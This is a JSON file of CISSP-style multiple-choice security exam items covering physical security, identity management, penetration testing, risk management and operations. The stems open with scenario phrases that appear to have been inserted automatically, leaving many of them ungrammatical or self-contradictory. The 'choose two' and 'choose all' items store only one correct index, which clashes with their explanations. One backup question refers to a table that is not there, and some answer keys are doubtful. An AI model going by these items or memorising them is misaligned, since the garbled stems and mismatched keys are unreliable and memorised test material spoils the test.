      "stem": "The senior management of a government agency that maintains sensitive data of national interest recently received an alarming risk assessment report. Employees have been negligently conversing and discussing sensitive and confidential data on the phone with field officers and stakeholders in their office spaces, escalators, and staircases. What will be the most appropriate physical security control to address the concern?",
      "choices": [
        "Establishing communication Channel Encryption",
        "Establishing robust access controls",
        "Establishing a sensitive compartmented information facility (SCIF)",
        "Delivering security awareness training"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct in this scenario. Sensitive compartmented information facility (SCIF) is an isolated and restricted space designed for conducting confidential discussions. SCIF controls are therefore the best method to address work area security challenges. Even though \"security awareness training\" (4) may appear the best option, the question primarily refers to the physical security domain, and SCIF is the best choice in this instance because you cannot replace the requirement for a \"perimeter wall\" with security awareness training programs. Establishing communication encryption and access controls (A and B, respectively) are technical controls and will have little to do with the insider threat outlined in the scenario. Security awareness training is the second most appropriate control to enhance the behavior of employees after establishing restricted work area security."
    },
    {
      "id": "d5-q100",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "After a control-gap review, platforms such as Google, Facebook, and LinkedIn allow you to log in to websites of your choice without sharing your credential with third parties. This will help you to gain access to sites without actually creating accounts on each platform you might be interested in accessing. The platforms leverage Identity as a Service (IDaaS) with third parties by sharing certain information about your account but without exposing and sharing your credentials. What primarily enables the login and access mechanism demonstrated in the scenario?",
      "choices": [
        "Open ID Connect (OIDC)",
        "Open Authorization (OAuth)",
        "Security Assertion Markup Language (SAML)",
        "Single Sign-On (SSO)"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct in this scenario. Open Authentication (OAuth) primarily enables access through secure access delegation. Open ID Connect (OIDC) and OAuth are very complementary standards but OIDC functions on top of OAuth to provide authentication services to dependent parties (customers) and therefore option 1 is incorrect. Security Assertion Markup Language (SAML) is a secure framework for exchanging identity and credential information among cooperating organizations. Single Sign-On (SSO) is an access control property that authenticates users to gain access to multiple related applications using a single credential."
    },
    {
      "id": "d5-q101",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "ABC PLC works in collaboration with XYZ Limited on many projects. Moreover, they want to allow users of each organization to gain access to centralized systems, applications, and resources to facilitate their work. Besides, users will not be required to create an account in each organization to gain access to the shared resources. They will be simply granted access to the shared systems using a single set of credentials. This will reduce user administration and provisioning overheads and will enable the companies to focus on their business functions. What best meets the requirements outlined in the scenario?",
      "choices": [
        "Managed Security Services Provider (MSSP)",
        "Identity as Service (IDaaS)",
        "Single Sign-On (SSO)",
        "Federated Identity Management (FIM)"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct in this scenario. Federated Identity Management (FIM) enables different organizations to grant access to systems and applications through a single credential. FIM will extend the Single Sign-On (SSO) concept beyond a single organization, whereas SSO is applicable to authenticating entities and related applications within a single organization. Identity as Service (IDaaS) is a subset of federated identity management. Managed Security Service Provider (MSSP) focuses on providing security functionalities to organizations as a service."
    },
    {
      "id": "d5-q102",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "Priya’s organization recently decided to authenticate its employees through Multi-Factor Authentication (MFA) techniques before permitting access to its sensitive organizational data. What best satisfies the new requirement?",
      "choices": [
        "Smartcard, token, fingerprint",
        "Password, PIN, smartcard",
        "Retina scan, token, fingerprint",
        "Smartcard, fingerprint, password"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct in this scenario. Unlike single- and two-factor authentication methods, MFA employs two or more authentication factors. Only option 4 precisely reflects something you know (password), something you have (smartcard), and something you are (fingerprint) factors. Authentication factors help organizations to develop hard-to-break security controls and multifactor authentication is a desirable technique to safeguard assets."
    },
    {
      "id": "d6-q105",
      "domain": "6. Security Assessment and Testing",
      "stem": "During a security governance meeting, soori, the newly crowned network engineer of ABC Limited, is worried about a report of suspicious traffic to the business’s web applications. Moreover, he decided to hire a penetration testing organization to evaluate the effectiveness of the security controls in place and further decided to share no information with the testers. What is the most appropriate option to undertake the test?",
      "choices": [
        "White-box testing",
        "Black-box testing",
        "Gray-box testing",
        "Blue-box testing"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct in this scenario. Black-box testing is a type of testing in which the tester conducts the test procedure with zero knowledge of the environment under consideration. The testers depend on reconnaissance, banner grabbing, and other techniques to gather information for further exploitation. This test is the most realistic and effective method to discover and exploit vulnerabilities. However, it may cause unintended interruption to the business. Whereas white-box testers have complete knowledge of the environment, gray-box testing is undertaken based on partial knowledge of the platform to be tested. Since there is no category of testing dubbed blue-box testing in penetration testing, it is an incorrect option."
    },
    {
      "id": "d6-q106",
      "domain": "6. Security Assessment and Testing",
      "stem": "During a quarterly audit, as a part of penetration testing, a tester is conducting targeted phishing attacks against your enterprise. The email impersonates an alert generated by the monitoring system. When a user clicks the link, they are redirected to a web page that looks exactly like your business’s collaboration software's login page. The tester wants to capture users’ credentials to access the business’s resources and then elevate their privileges. The tester is in the ___ PHASE of the penetration process?",
      "choices": [
        "Planning",
        "Reporting",
        "Information gathering",
        "Attack"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct in this scenario. The penetration tester is in the attack phase of the penetration process. This is the third phase in the penetration process, wherein the tester is trying to exploit the vulnerability found within the system. In this scenario, the tester did the planning and gathered information by understanding the organization’s monitoring system and cloning their Office 365 web page. The tester plans to send spoofed emails to the employees to gather their credentials and elevate their privileges to gain administrative access. Planning is the first phase of penetration testing. Security personnel from the organization and the tester identify the systems to be targeted and plan the scope of the project. Information gathering is the second phase in the penetration process. The attacker tries to find information about the target by scanning the external network using tools such as Network mapper (Nmap) or by capturing publicly available information from social networking sites to plan an attack against the organization. Reporting is the last stage of the process, and it includes documenting the attack and recommendations to improve the security posture. This confidential report must be delivered securely."
    },
    {
      "id": "d8-q75",
      "domain": "8. Software Development Security",
      "stem": "During a post-incident lessons-learned meeting, at a multinational bank, which option processes ensures that there is consistency between the accounting records and production environment and that unauthorized alterations to the configuration have not been made?",
      "choices": [
        "Configuration audit",
        "Configuration control",
        "Configuration identification",
        "Request control"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct for this case. Periodic configuration auditing is carried out to ensure that there is a match between the accounting records and production environment and that there are no unauthorized changes to the configuration. Option 2 is not correct because the configuration control process makes sure that any changes made to the software version adhere to the control and configuration management policies. Option 3 is not correct because configuration identification is a process whereby software product configuration in the entire organization is documented by administrators. Option 4 is not correct because request control refers to a process that lays down a framework through which consumers can make modification requests, developers can give priority to various tasks, or managers can carry out a cost/benefit analysis."
    },
    {
      "id": "d8-q76",
      "domain": "8. Software Development Security",
      "stem": "While planning a control enhancement roadmap, at a multinational bank, a malicious code author managed to access Adam's files after modifying his operating system using malicious code. Which type of exploit is the attacker likely to have applied to achieve this?",
      "choices": [
        "Buffer overflow",
        "Rootkit",
        "Back door",
        "Escalation of privilege"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct for this case. Back doors refer to command sequences that are undocumented and people who are knowledgeable about back doors take advantage of them to bypass restrictions that are in place. Option 1 is not correct because buffer overflow is a situation that occurs when a developer fails to conduct a proper validation of user input to make sure that it is of the correct size. Option 2 is not correct because the rootkit refers to one of the strategies that attackers employ to execute the escalation of privilege attacks. Option 4 is not correct because the escalation of privileges refers to a situation where attackers expand their access from a normal user account to what they are not allowed to access after compromising a system."
    },
    {
      "id": "d1-q128",
      "domain": "1. Security and Risk Management",
      "stem": "As part of organization risk governance, at a logistics enterprise, which canon in the (ISC)2 code of ethics states that security professionals should execute their duties in a manner that is honorable, honest, just, responsible, and legal?",
      "choices": [
        "The first",
        "The second",
        "The third",
        "The fourth"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct for this case. (ISC)2 code of ethics has four canons. The canons have been arranged based on their order of importance. The second canon is \"act honorably, honestly, justly, responsibly, and legally.\" The first canon is \"protect society, the common good, necessary public trust and confidence, and the infrastructure,\" the third canon is \"provide diligent and competent service to principals,\" and the fourth canon is \"advance and protect the profession.\""
    },
    {
      "id": "d1-q129",
      "domain": "1. Security and Risk Management",
      "stem": "During a post-incident lessons-learned meeting, at a healthcare provider, you have recently been hired as a CISO in a multinational business. You've already studied the business's mission, vision, goals, corporate strategy, and organization and security needs, and you want to develop the business's information security strategy. Which option should you do first?",
      "choices": [
        "Develop the company's information security program policy.",
        "Consider constraints and resources.",
        "Do a risk assessment.",
        "Determine the milestones and blueprint."
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct for this case. As a CISO, your first assignment should be to conduct a risk assessment (gap analysis) which will help you address the gaps in the company's security program. Options 1, 2, and 4 are incorrect because developing the company's information security program policy, consideration of constraints and resources, and determination of milestones and blueprint can only be done after identifying the potential risks."
    },
    {
      "id": "d1-q130",
      "domain": "1. Security and Risk Management",
      "stem": "While planning a control enhancement roadmap, at a federal contractor, which type of investigation is conducted internally against an employee when they violate their enterprise's policies?",
      "choices": [
        "Criminal investigation",
        "Civil investigation",
        "Administrative investigation",
        "Regulatory investigation"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct for this case. An organization conducts an administrative investigation if an employee is suspected to have violated an organizational policy. A criminal investigation is the responsibility of the government whenever they suspect a violation of its regulations. A civil investigation is carried out by citizens in a civil suit. A regulatory investigation involves a regulatory body (for example, EPA or FTC)."
    },
    {
      "id": "d1-q131",
      "domain": "1. Security and Risk Management",
      "stem": "An employee is drafting a document that will provide detailed information on how a security system in the organization will be implemented. Which document is being prepared?",
      "choices": [
        "Guideline",
        "Policy",
        "Procedure",
        "Baseline"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct for this case. A procedure (also known as a security procedure) gives a detailed highlight of how a security system will be implemented within an organization. A procedure is developed for each task that an organization performs in accordance with the standards, guidelines, and baselines. A guideline shows how baselines and security standards can be enforced. A policy highlights what needs protection and to what extent it should be protected. A baseline refers to the minimum security standard that should be enforced on an infrastructure."
    },
    {
      "id": "d1-q132",
      "domain": "1. Security and Risk Management",
      "stem": "As part of organization risk governance, at a logistics enterprise, which option is not one of the important roles that a senior manager can play on a organization continuity planning team?",
      "choices": [
        "Acting as an arbitrator when disputes occur among members.",
        "Setting priorities for the team.",
        "Obtaining resources for the team.",
        "Training staff."
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct for this case. Senior managers play several critical roles during the business continuity planning process. For instance, they ensure the planning team has all the resources that they need, set priorities, and act as arbitrators in the event of any disputes among team members. Therefore, options 1, 2, and 3 are all roles played by a senior manager, option 4 is not. Training staff is the work of the human resource department."
    },
    {
      "id": "d1-q133",
      "domain": "1. Security and Risk Management",
      "stem": "During a post-incident lessons-learned meeting, at a telecom operator, an employee is investigating a security incident where it was discovered that an attacker created a fake user account to take advantage of the system vulnerability and grant administrative rights to that account. In reference to the STRIDE model, these types of attacks can be referred to as __________ and _________. (Choose TWO of the following answer options.)?",
      "choices": [
        "Tampering",
        "Information disclosure",
        "Elevation of privileges",
        "Spoofing"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "The correct answers are options 3 and 4. First, the hacker gained access to the system using false credentials. This is called spoofing (4). The fake credentials could be a fake username, e-mail, password, SSID, IP address, etc. When the spoofed credentials are fed into the system, it assumes that they are legitimate and grants access. Secondly, the hacker upgraded the limited user account and provided it with administrator powers. This is called elevation of privileges (3). Option 1 is not correct because tampering attacks attempt to interfere with the integrity of resources or data. Option 2 is not correct because information disclosure refers to a situation where a system accidentally reveals classified data to the users."
    },
    {
      "id": "d1-q134",
      "domain": "1. Security and Risk Management",
      "stem": "An employee wants to develop a organization continuity plan, but they are not sure which resources to prioritize due to the challenge of putting together information about intangible and tangible assets. Which risk assessment approach would you advise them to apply?",
      "choices": [
        "Qualitative risk assessment",
        "Quantitative risk assessment",
        "Both qualitative and quantitative risk assessments",
        "Neither qualitative nor quantitative risk assessment"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct for this case. They would experience the best outcome by applying a combination of both qualitative and quantitative risk assessment elements. Qualitative risk assessment does a good job of handling intangible risks, while quantitative risk assessment works excellently in analyzing financial (or other tangible) risks. Option 1 and option 2 are incorrect since both quantitative and qualitative risk assessments have their own limitations related to the resource and information requirements for analytical or data models. Therefore, they should combine the two to make their opportunity and risk more predictable. option 4 is not correct since they must apply at least one or both of these risk assessment approaches."
    },
    {
      "id": "d1-q135",
      "domain": "1. Security and Risk Management",
      "stem": "In preparation for an external audit, at a telecom operator, which option enterprises is most likely to be impacted by the provisions of FISMA?",
      "choices": [
        "Hospitals",
        "School districts",
        "Defense contractors",
        "Financial institutions"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct for this case. The Federal Information Security Management Act (FISMA) applies to federal government contractors as well as agencies. The law which came into existence in 2002 requires federal contractors and agencies to devise a program that guarantees information security and protection, and documents and executes it. Among the mentioned entities, the one that is likely to operate subject to FISMA is the defense contractor. Option 1 is not correct because hospitals are affected by the Health Insurance Portability and Accountability Act (HIPAA). Option 2 is not correct because school districts are likely to be impacted by the Family Education Rights and Privacy Act (FERPA). Option 4 is not correct because financial institutions, such as banks, are required to comply with the Gramm-Leach-Billey Act (GLBA)."
    },
    {
      "id": "d2-q78",
      "domain": "2. Asset Security",
      "stem": "During a post-incident lessons-learned meeting, at a telecom operator, a top-ranking U.S. military officer is tasked with securing some sensitive information, the exposure of which might result in a serious threat to national security. In reference to the U.S. standards of data classification, this data should be classified as_________?",
      "choices": [
        "Secret",
        "Confidential",
        "Top secret",
        "Unclassified"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct for this case. because if secret data leaks, the harm will be serious damage. Option 3 is not correct because according to the U.S. government's standards of data classification, top-secret data is the most guarded because, if it leaks, it can result in an exceptionally grave national security threat of a very high magnitude. Option 2 is not correct because confidential data is proprietary. Option 4 is not correct since unclassified data can be accessed by any member of the public."
    },
    {
      "id": "d2-q79",
      "domain": "2. Asset Security",
      "stem": "While planning a control enhancement roadmap, at a federal contractor, a security officer for a multinational organization has been assigned the responsibility of labeling several important files by embedding data on them. This type of label is referred to as_____________________?",
      "choices": [
        "Steganography",
        "Digital watermark",
        "Data Loss Prevention (DLP)",
        "Copyright notice"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct for this case. A digital watermark refers to a type of marker that is embedded in media such as images, videos, or audio to label it or help identify the file owner. Option 1 is not correct because steganography refers to the science applied to hiding information, usually in files or images. Option 3 is not correct because (DLP) Data Loss Prevention is a remedy that was developed to ensure data is not lost. Option 4 is not correct because a copyright notice offers information concerning the copyright asserted on a file."
    },
    {
      "id": "d2-q80",
      "domain": "2. Asset Security",
      "stem": "During a post-incident lessons-learned meeting, at a telecom operator, a CEO has purchased new computers for their enterprise. However, they have been instructed by their employees not to dispose of the old computers because they still have information that is considered useful to the enterprise. The computers can only be disposed of when the information is no longer needed. Which element of asset retention is this?",
      "choices": [
        "Personnel retention",
        "Record retention",
        "Media retention",
        "Data corruption"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct for this case. Record retention describes the practice whereby important information is retained for the period of time in which it is still considered useful and only thereafter destroyed. In this scenario, 'the CEO's act is an example of record retention. Option 1 is not correct since personnel retention refers to the knowledge that was acquired by an employee while working in an organization. Option 3 is not correct because media retention refers to the keeping of spoilt media components to ensure data privacy. Option 4 is not correct because data corruption is not an element of data retention."
    },
    {
      "id": "d3-q99",
      "domain": "3. Security Architecture and Engineering",
      "stem": "In preparation for an external audit, at a healthcare provider, a security administrator in a financial auditing organization is required to enforce access controls to make sure that users do not gain access as per their earlier activity. For instance, after a consultant has accessed data owned by one of their clients, they may not have access to any data belonging to that client's competitors. The security model that matches this need is___________?",
      "choices": [
        "Brewer - Nash",
        "Bell-LaPadula",
        "Biba",
        "Clark-Wilson"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct for this case. Brewer–Nash is a security model in which access controls can undergo dynamic changes depending on the actions of the user. This model is often applied in scenarios that are similar to those in the above scenario to enforce a \"Chinese wall\" that ensures a subject does not access data from various clients of similar interests. Options 2, 3, and 4 are also security models but cannot be applied in this environment. With the Bell-LaPadula Model, every subject is assigned a security clearance level, while a security level is assigned to each object. The Biba Model makes it hard to modify data by employing two properties: an integrity property and a simple integrity property. The Clark-Wilson Model ensures that a subject uses a program to access an object"
    },
    {
      "id": "d3-q100",
      "domain": "3. Security Architecture and Engineering",
      "stem": "An employee would like to conduct threat modeling for their organization to improve the security of their systems. They have opted to apply the Process for Attack Simulation and Threat Analysis (PASTA) methodology, which follows a seven-step approach to identify the potential threats and vulnerabilities to a system and the available countermeasures. Using this methodology, what should the employee do first?",
      "choices": [
        "Analyze risks and management",
        "Define the objectives for the risk analysis",
        "Analyze strengths",
        "Define the technical scope"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct for this case. The PASTA (Process for Attack Simulation and Threat Analysis) methodology has seven steps. The first step is focused on the definition of objectives. Option 1 is not correct because risk and impact analysis is the last step. Option 3 is not correct because analyzing strengths is not one of the steps in the PASTA methodology. Option 4 is not correct because the definition of technical scope is the second step. The third PASTA step involves decomposing and analyzing the application, the fourth step is threat analysis, the fifth step involves analyzing vulnerabilities and weaknesses, and the sixth step is analyzing modeling and simulation."
    },
    {
      "id": "d1-q136",
      "domain": "1. Security and Risk Management",
      "stem": "While planning a control enhancement roadmap, at a multinational bank, you work as a CISO in an enterprise. The organization wants to purchase new computers and some software for their new branch. You have been tasked with conducting a security assessment of potential vendors that have shown interest in supplying the products. Which option is NOT part of the process you will complete to determine the right vendor?",
      "choices": [
        "Ask the vendor to provide a third-party audit report.",
        "Plan a visit to the vendor’s offices. While there, pose some questions to the managers and employees regarding their security policies.",
        "Review the vendor's catalogs and compare prices to determine which vendor offers the best price.",
        "Review the vendor's documents, such as operating documentation, baselines, standards, and policies."
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct for this case. Before the procurement department purchases new products, it should first ensure that the vendor is an entity that can be trusted. This can be done through a security assessment of various vendors that have shown interest in doing business with your organization before final selection. Security assessment of vendors may include reviewing the vendor's third-party audit report (1), which must be based on a framework that resonates with the organization's objectives. The CISO may also pay a surprise site visit to the vendor's premises (2) in order to gain firsthand experience with their operation (to determine whether they adhere to security policies, for example). The vendor's operating documents, such as operating documentation, baseline, standards, and policies (4), can also be checked to find out whether they have aligned with security best practices. However, comparing vendors' prices and catalogs (3) is not part of the security assessment."
    },
    {
      "id": "d3-q101",
      "domain": "3. Security Architecture and Engineering",
      "stem": "As part of organization risk governance, at a multinational bank, one employee's primary responsibility is to ensure that all of the business’s web-based applications are secure. They are planning a workshop to educate developers on the most common security vulnerabilities of web applications. From which source can they get a proper list of the most common issues related to web applications?",
      "choices": [
        "Cloud Security Alliance (CSA)",
        "Open Web Application Security Project (OWASP)",
        "Global Data Alliance (GDA)",
        "National Security Administration (NSA)"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct for this case. The Open Web Application Security Project (OWASP) produces a listing of the ten most common security vulnerabilities of web applications every year, which security professionals and developers worldwide utilize for training and education needs. The issues listed by OWASP guide most of the security testing for web application products. Option 1 is not correct since the CSA’s (Cloud Security Alliance) main aim is to define and raise awareness pertaining to security matters in cloud computing. Option 4 is not correct because the NSA (National Security Agency) mainly focuses on guarding national communication systems integrity as well as gathering and processing data concerning secret communications that involve foreign adversaries to strengthen national security as well as foreign policy. Option 3, Global Data Alliance, is not part of cyber security associations."
    },
    {
      "id": "d5-q103",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "A organization hosts part of its server within the enterprise's data center and the rest in the cloud. Can they apply Identity as a Service (IdaaS) to support identity needs?",
      "choices": [
        "Yes",
        "No"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Identity as a Service can be used by any system. The identity verification not have to originate from within a 'cloud' to be answered by the cloud."
    },
    {
      "id": "d5-q104",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "In preparation for an external audit, at a multinational bank, key Distribution Center, Ticket Granting Ticket are important components of which authentication protocol?",
      "choices": [
        "Kerberos",
        "RADIUS",
        "TACACS+",
        "OAuth"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct for this case. Windows utilizes Kerberos for authentication. Option 2 is not correct because RADIUS is utilized for network devices, modems, and wireless networks. Option 3 is not correct since TACACS+ is applied in the case of network devices. Option 4 is not correct as OAuth is mainly applied to web applications."
    },
    {
      "id": "d6-q107",
      "domain": "6. Security Assessment and Testing",
      "stem": "While planning a control enhancement roadmap, at a telecom operator, an employee is scanning a network port of a web server used in his business. They are using an external network to run the scan because they want to get the perspective of a hacker. Which option results should worry them?",
      "choices": [
        "1433/open",
        "443/open",
        "22/filtered",
        "80/open"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct for this case. An open port is a sign of a looming security risk (risk indicator). Port 1433 is never expected to be open since it is a database port and is not required to have any exposure to an external network. The only ports that should be open on the web server are ports 443 and 80. So, there is no need to worry if these are open. Therefore, options 2 and 4 are incorrect. Option 3 is not correct since it indicates that some filtering may be taking place on the port, so you can’t use it at the moment."
    },
    {
      "id": "d6-q108",
      "domain": "6. Security Assessment and Testing",
      "stem": "During a post-incident lessons-learned meeting, at a telecom operator, an employee has been tasked with helping their organization choose audit standards that the organization will adhere to in all its branches. Which option IT standards are they not likely to suggest?",
      "choices": [
        "ISO/IEC (International Standards Organization/International Electrotechnical Committee) 27002",
        "COBIT",
        "Statement of Standards for Attestations Engagement (SSAE)-16",
        "ITIL"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct for this case. ITIL, initially referred to as IT Infrastructure Library, is not applied in auditing; it is a set of IT management practices. ISO/IEC 27002, COBIT (Control Objectives for Information and Related Technology), as well as SSAE–16 (The Statement on Standards for Attestation Engagements number 16 form part of IT standards utilized in auditing."
    },
    {
      "id": "d7-q102",
      "domain": "7. Security Operations",
      "stem": "A security review team is evaluating whether at a multinational bank, which option is NOT a basic preventive measure that an organization can implement to ensure the security of their applications and systems?",
      "choices": [
        "Run forensic imaging of the entirety of their systems and applications.",
        "Get rid of accounts and services that are not required.",
        "Ensure that updated patch levels are maintained in all their applications and operating systems.",
        "Enforce a system to detect and prevent intrusion."
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct for this case. Forensic imaging is not a part of preventive measures. Instead, this is performed in the process of responding to an incident. Removing accounts and services that are not in use, maintaining updated patch levels, and enforcing a system that can detect and prevent intrusions are all primary preventive measures."
    },
    {
      "id": "d7-q103",
      "domain": "7. Security Operations",
      "stem": "In preparation for an external audit, at a healthcare provider, the CISO for a bank has been tasked with the responsibility of enforcing a new security principle that will grant employees administrative privileges within the banking system. They have designed the process in such a manner that employees will require approval from the bank's Chief Financial Officer and the General Manager to access the system. Which security mechanism has the CISO implemented?",
      "choices": [
        "Job rotation",
        "Need-to-know",
        "Mandatory vacations",
        "Two-man rule"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct for this case. In this case, the CISO has developed a mechanism that requires the approval of two individuals before a sensitive action can be executed. The principle is referred to as the two-man rule or two-person control. Option 1 is not correct because job rotation (also known as the rotation of duties) allows employees to rotate through various job responsibilities as a way of cross-training and ensuring minimal fraud. Option 2 is not correct because need-to-know is a principle that ensures that employees can only access resources that are required to accomplish their specific job roles. Option 3 is not correct because mandatory vacation refers to a process wherein an employee is subjected to a compulsory vacation of about one or two weeks to give space for peer review or fraud detection."
    },
    {
      "id": "d7-q104",
      "domain": "7. Security Operations",
      "stem": "While planning a control enhancement roadmap, at a healthcare provider, administrators play an active role in curbing the scope or impact of an incident during the ___________ phase of incident response?",
      "choices": [
        "Recovery",
        "Response",
        "Versioning",
        "Mitigation"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct for this case. During the mitigation phase of incident response, the primary focus is usually on what can be done to reduce the extent of damage caused by an incident. Some of the actions during this phase include those limiting the efficacy and scope of an incident. Option 1 is not correct because recovery refers to the process whereby the system is transformed into its normal state. Option 2 is not correct because response refers to how the incident is received and acted upon. Option 3 is not correct because versioning is not part of the procedures in incident response."
    },
    {
      "id": "d7-q105",
      "domain": "7. Security Operations",
      "stem": "The security officer in a medium-sized organization wants to deploy a deliberate false loophole that can be used to trap intruders in their systems. Which option can they utilize to achieve this?",
      "choices": [
        "Darknet",
        "Warning banner",
        "Pseudoflaw",
        "Honeynet"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct for this case. Pseudoflaws refer to loopholes or false vulnerabilities that are created intentionally with the aim of tempting attackers. Option 1 is not correct because a darknet refers to a portion of network address space that is idle without network activity and can be utilized in spying on any unauthorized activity. Option 2 is not correct because a warning banner refers to a legal device that plays the role of alerting attackers that they do not have permission to log into a system. Option 4 is not correct because a honeynet is a chain of several honeypots that work together to simulate a system."
    },
    {
      "id": "d7-q106",
      "domain": "7. Security Operations",
      "stem": "During a post-incident lessons-learned meeting, at a logistics enterprise, three of the following are activities that are undertaken during the patch management process. Which one is NOT?",
      "choices": [
        "Auditing of patches",
        "Evaluation of patches",
        "Testing of patches",
        "Deployment of all patches"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct for this case. An organization is only required to deploy patches that are necessary. Option 1 is not correct because auditing is done to find out whether patches have been applied to the organization's systems. Option 2 is not correct because an evaluation of patches is done within an organization to determine what patches are needed. Option 3 is not correct because patches are usually tested to see whether they can cause any unforeseen issues to the systems."
    },
    {
      "id": "d7-q107",
      "domain": "7. Security Operations",
      "stem": "A technician in an organization receives complaints from employees about a network issue; they decide to troubleshoot it and discover that the problem is the result of a closed port. After opening the port, the issue is resolved. Later, an attacker is able to hack their systems after accessing that port. Which management process was the technician supposed to follow to avoid such an incident?",
      "choices": [
        "Change management process",
        "Vulnerability management process",
        "Patch management process",
        "Configuration management process"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct for this case. The technician was supposed to adhere to the change management process by first evaluating the change, then implementing it. This helps avoid unforeseen system failure or the weakening of security. Option 2 is not correct because the vulnerability management process ensures systems are not subjected to common or known vulnerabilities. Option 3 is not correct because the patch management process checks that the systems are updated. Option 4 is not correct because the configuration management process makes sure that the deployed systems are similar. Apart from change management, the remaining processes cannot stop unauthorized changes."
    },
    {
      "id": "d7-q108",
      "domain": "7. Security Operations",
      "stem": "A security review team is evaluating whether at a cloud SaaS company, an employee is responsible for backing up their enterprise's main file server. According to their backup plan, full backups are performed every Wednesday at 11:00 pm, while differential backups happen at similar times during all other days. The table below shows how the files change. With reference to the information on the table, how many files will be copied during Friday's backup?",
      "choices": [
        "Six",
        "Five",
        "Three",
        "Two"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct for this case. According to the schedule, every file on the server will be backed up on Wednesday evening's full backup. Then, during Friday's differential backup, any file modified and created since the previous full backup will be copied. There are five of these files: files A, B, C, E, and F."
    },
    {
      "id": "d3-q102",
      "domain": "3. Security Architecture and Engineering",
      "stem": "A security review team is evaluating whether at a logistics enterprise, bina works as CISO in a local bank. She has proposed to the bank manager that they need to hash all the messages sent to their customers to ensure the messages remain authentic. The bank manager has requested that Bina share some features of hashing algorithms with them before they approve the proposal. Which option are characteristics of a hashing algorithm? Choose ALL answers that apply.?",
      "choices": [
        "A hashing algorithm takes variable-length input.",
        "Getting two messages that share the same hash value is almost impossible.",
        "A hashing algorithm can be reversed.",
        "A hashing algorithm requires a cryptographic key."
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "The correct answers are options 1 and 2. Hash functions take a variable-length input, and it's almost impossible to have two messages with a common value in hash functions. 3 is incorrect because the hashing algorithm cannot be reversed. Option 4 is not correct because there is no secrecy attribute within hash functions, so they do not need a cryptographic key."
    },
    {
      "id": "d7-q109",
      "domain": "7. Security Operations",
      "stem": "A security review team is evaluating whether at a telecom operator, the following statements refer to the concept of executive succession planning. Which statement is INCORRECT?",
      "choices": [
        "Executive succession planning involves bringing a skeleton crew onboard following a disaster to continue essential operations.",
        "The responsibilities of deputies are documented.",
        "Two or more senior employees should not be exposed to a particular risk concurrently.",
        "In the event that a senior executive quits, the organization is protected by predetermined steps."
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
